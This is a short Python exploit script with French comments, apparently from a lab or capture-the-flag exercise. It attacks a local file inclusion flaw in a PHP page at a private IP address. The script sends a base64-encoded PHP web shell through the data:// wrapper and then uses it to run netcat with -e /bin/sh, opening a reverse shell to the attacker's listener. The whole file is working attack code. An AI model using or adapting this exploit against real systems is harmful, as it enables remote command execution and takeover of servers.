#encoding:utf-8
import requests,sys,base64
# Exploitation de la faille LFI via le wrapper data://text/plain;base64=
#nc -lvp 12345 sur l'h√¥te distant
if len(sys.argv)!=3:
	print "Usage : python exploit_lfi.py <local IP> <local Port>"
	exit(1)

b64payload = base64.b64encode("<?php system($_GET['cmd']); ?>")
requests.get("http://192.168.4.1/read.php",params={"file":"data://text/plain;base64,"+b64payload,"cmd":"nc "+sys.argv[1]+" "+sys.argv[2]+" -e /bin/sh"})
